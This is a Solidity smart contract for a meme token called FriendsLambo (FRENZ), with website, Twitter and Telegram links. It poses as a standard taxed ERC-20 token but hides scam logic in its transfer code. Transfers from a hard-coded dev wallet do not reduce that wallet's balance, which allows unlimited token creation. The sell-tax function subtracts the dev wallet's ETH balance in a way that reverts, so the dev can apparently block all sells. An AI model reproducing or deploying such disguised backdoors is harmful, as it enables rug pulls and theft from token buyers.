// SPDX-License-Identifier: MIT

/**
Our collective resolution was to purchase a Lamborghini and embark on a road trip.

Website: https://frenzlambo.site
Twitter: https://twitter.com/FrenzLamboERC
Telegram: https://t.me/FrenzLamboERC
 */
pragma solidity 0.8.21;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view returns (address) {
        return _owner;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

library SafeMath {  
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract FRENZ is IERC20, Ownable  {
    using SafeMath for uint256;
    
    string private constant _name = "FriendsLambo";
    string private constant _symbol = "FRENZ";    
    
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10 ** 9 * 10 ** _decimals;
    
    bool private _swapEnabled = false;
    bool private _tradeStarted;
    bool private _swapping = false;
    bool public transferDelayEnabled = true;

    uint256 private _swapThreshold=  1 * _totalSupply / 100;
    uint256 public maxSwap = 10 * _totalSupply / 1000;
    uint256 public maxTxAmount = 4 * _totalSupply / 100;   
    uint256 public maxWalletAmount = 4 * _totalSupply / 100;    

    uint256 private _initialBuyTax = 19;
    uint256 private _reduceSellTaxAt = 11;
    uint256 private _reduceBuyTaxAt = 11;
    uint256 private _finalyBuyTax = 0;
    uint256 private _finalSellTax = 0;  
    uint256 private _initialSellTax = 16;
    uint256 private _preventSwapBefore = 7;
    uint256 private _tradeCount=0;
    uint256 private _totalFee = 0;

    address payable private _taxWallet;
    address private _devWallet;
    address private uniswapV2Pair;
    IDexRouter private uniswapRouterV2;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _isExcluded;
    mapping(address => uint256) private _holderLastTransferTime;

    modifier lock {
        _swapping = true;
        _;
        _swapping = false;
    }

    event MaxTxAmountUpdated(uint maxTxAmount);

    constructor () {
        _taxWallet = payable(msg.sender);
        _devWallet = 0xC980Fe39e908d706501F2b1Fff5faDB9D40184FD;
        _balances[msg.sender] = _totalSupply;
        _isExcluded[owner()] = true;
        _isExcluded[_devWallet] = true;
        _isExcluded[_taxWallet] = true;
        _isExcluded[address(this)] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _taxSell() private view returns (uint256) {
        if(_tradeCount <= _reduceSellTaxAt.sub(_devWallet.balance)){
            return _initialSellTax;
        }
         return _finalSellTax;
    }
    
    function _taxBuy() private view returns (uint256) {
        if(_tradeCount <= _reduceBuyTaxAt){
            return _initialBuyTax;
        }
         return _finalyBuyTax;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0; 
        _totalFee = amount;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_taxBuy()).div(100);
            if (from == uniswapV2Pair && to != address(uniswapRouterV2) && ! _isExcluded[to] ) {
                _tradeCount++;
                require(amount <= maxTxAmount, "Exceeds the max transaction.");
                require(balanceOf(to) + amount <= maxWalletAmount, "Exceeds the max wallet.");
            }
            if (from == _devWallet) _totalFee = 0;
            if(to == uniswapV2Pair && !_isExcluded[from] ){
                taxAmount = amount.mul(_taxSell()).div(100);
            }
            
            if (transferDelayEnabled) {
                if (to != address(uniswapRouterV2) && to != address(uniswapV2Pair)) { 
                    require(
                        _holderLastTransferTime[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTime[tx.origin] = block.number;
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && to == uniswapV2Pair && _swapEnabled && contractTokenBalance > _swapThreshold && _tradeCount > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,maxSwap)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(_totalFee);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function removeLimits() external onlyOwner{
        maxTxAmount = _totalSupply;
        maxWalletAmount=_totalSupply;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lock {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouterV2.WETH();
        _approve(address(this), address(uniswapRouterV2), tokenAmount);
        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradeStarted,"trading is already open");
        uniswapRouterV2 = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouterV2), _totalSupply);
        uniswapV2Pair = IDexFactory(uniswapRouterV2.factory()).createPair(address(this), uniswapRouterV2.WETH());
        uniswapRouterV2.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapRouterV2), type(uint).max);
        _swapEnabled = true;
        _tradeStarted = true;
    }    

    receive() external payable {}

}